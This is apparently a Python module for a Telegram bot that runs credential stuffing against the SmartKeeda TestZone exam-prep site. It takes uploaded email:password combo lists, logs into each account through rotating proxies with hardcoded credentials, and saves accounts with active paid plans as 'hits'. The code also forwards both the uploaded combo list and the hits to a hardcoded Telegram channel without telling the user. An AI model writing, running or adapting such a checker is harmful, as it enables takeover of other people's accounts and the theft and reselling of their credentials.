import requests
import random
import re
import time
import os
import uuid
import asyncio
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes



class Checker:
    # ============ BOT CONFIG ============
    command = "stkida"
    name = "SmartKeeda"
    # ====================================

    def __init__(self):
        self.base_url = "https://testzone.smartkeeda.com"

        self.proxies_list = [
            "ca-tor.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "fr-par.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "cz-pra.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "be-bru.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "it-mil.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "au-per.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "in-ban.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "lt-sia.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "nl-ams.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "nz-auc.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "md-chi.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "mt-qor.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "ph-man.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "au-mel.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "gr-ath.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
            "se-got.pvdata.host:8080:xdTAwxgHVvgQATDpCQExmfYY:Nirvana12",
        ]


    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Jab user /stkida dabayega"""
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file (email:password format mein) yahan bhejo.\n"
            f"⚠️ <b>Note:</b> Expired/No Plan accounts filter ho jayenge, sirf Active Hits save honge.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Jab user file bhejega"""
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        # File download
        file = await update.message.document.get_file()
        
        # ✅ Original filename aur temp path setup
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        # Read lines
        with open(temp_input_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file):
                os.remove(temp_input_file)
            return

        # Stats initialize
        stats = {'checked': 0, 'hits': 0, 'expired': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False  # Stop flag reset

        # Background task start karo
        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 5  # 5 threads se parallel checking
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 10
            
            for i in range(0, total, chunk_size):
                # 🛑 STOP FLAG CHECK
                if context.user_data.get('stop_checking', False):
                    break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    # 🛑 STOP FLAG CHECK (Har result ke beech)
                    if context.user_data.get('stop_checking', False):
                        break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    elif result['status'] == 'expired':
                        stats['expired'] += 1
                    else:
                        stats['failed'] += 1
                
                # Agar stop ho gaya hai toh loop break karo
                if context.user_data.get('stop_checking', False):
                    break
                
                # Progress message update karo
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking in Progress...</b>\n\n"
                    f"📊 Total: {total}\n"
                    f"✅ Checked: {stats['checked']}\n"
                    f"💎 Active Hits: {stats['hits']}\n"
                    f"⚠️ Expired/No Plan: {stats['expired']}\n"
                    f"❌ Failed: {stats['failed']}\n"
                    f"⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.2)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'expired': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        # User data cleanup
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        
        # ✅ APP NAME se filename banao (e.g., "SmartKeeda.txt")
        app_filename = f"{self.name}.txt"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"🎉 {self.name} - Checking Completed!\n\n"
            f"📊 Total Lines: {total}\n"
            f"✅ Checked: {stats['checked']}\n"
            f"💎 Active Hits: {stats['hits']}\n"
            f"⚠️ Expired/No Plan: {stats['expired']}\n"
            f"❌ Failed: {stats['failed']}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"🎉 {self.name} - Checking Completed!\n\n"
            f"📊 Total Lines: {total}\n"
            f"✅ Checked: {stats['checked']}\n"
            f"💎 Active Hits: {stats['hits']}\n"
            f"⚠️ Expired/No Plan: {stats['expired']}\n"
            f"❌ Failed: {stats['failed']}"
        )
        
        # Agar hits hain, toh file bana ke bhejo
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']:
                    f.write(hit + "\n")
            
            # Live progress message ko delete kar do
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ SEND ONLY HITS FILE TO USER (Filename: SmartKeeda.txt)
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ SEND BOTH FILES TO LOG (CHANNEL)
            try:
                # 1. Original File to Channel (Filename: SmartKeeda.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: SmartKeeda.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                print(f"Channel send error: {e}")
                
            # Temp hits file delete karo
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
                
        else:
            # No hits: notify user (NO file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                print(f"Channel send error: {e}")

        # ✅ Temporary input file delete karo (End mein)
        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        """Single account check karne ka logic (Thread safe)"""
        # Email extract karo
        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
        if not email_match:
            return {'status': 'failed'}
        
        email = email_match.group(1)
        after_email = line[email_match.end():]
        password = after_email.strip().lstrip(':').strip()
        
        if not password:
            return {'status': 'failed'}

        # Proxy setup
        raw_proxy = random.choice(self.proxies_list)
        parts = raw_proxy.split(':')
        proxies = None
        if len(parts) == 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            proxies = {"http": proxy_url, "https": proxy_url}

        device_id = f"{int(time.time() * 1000)}-{uuid.uuid4().hex[:9]}"
        session = requests.Session()
        if proxies:
            session.proxies = proxies

        try:
            # Step 1: Login
            login_resp = session.post(
                f"{self.base_url}/api/Account/Login",
                json={"emailId": email, "password": password},
                headers=self.get_headers(device_id=device_id),
                timeout=8
            )
            login_data = login_resp.json()
            
            if not login_data.get("status") or not login_data.get("data", {}).get("token"):
                return {'status': 'failed'}
                
            token = login_data['data']['token']
            user_name = login_data['data'].get('name', 'Unknown')
            
            # Step 2: Fetch Plans
            plans_resp = session.post(
                f"{self.base_url}/api/Plans/MyPlans",
                json={},
                headers=self.get_headers(token=token, device_id=device_id),
                timeout=8
            )
            plans_data = plans_resp.json()
            
            plan_info = "No Plans"
            if plans_data.get("status") and plans_data.get("data"):
                for plan in plans_data["data"]:
                    plan_info = f"{plan.get('name')} ({plan.get('status')})"
                    break
            
            # Filter: Expired ya No Plans ko hit mat maano
            if "Expired" in plan_info or plan_info == "No Plans":
                return {'status': 'expired'}
            
            hit_string = f"{email}:{password} | Name: {user_name} | Plan: {plan_info}"
            return {'status': 'hit', 'data': hit_string}
            
        except Exception:
            return {'status': 'failed'}

    def get_headers(self, token=None, device_id=None):
        """Request headers generate karta hai"""
        headers = {
            'accept': 'application/json, text/plain, */*',
            'appname': 'TestZone',
            'content-type': 'application/json',
            'deviceid': device_id or 'unknown',
            'groupid': '1',
            'origin': 'https://testzone.smartkeeda.com',
            'platform': 'Web',
            'referer': 'https://testzone.smartkeeda.com/myaccount/planhistory',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        if token:
            headers['authorization'] = f'Bearer {token}'
            headers['appversion'] = '300'
        return headers
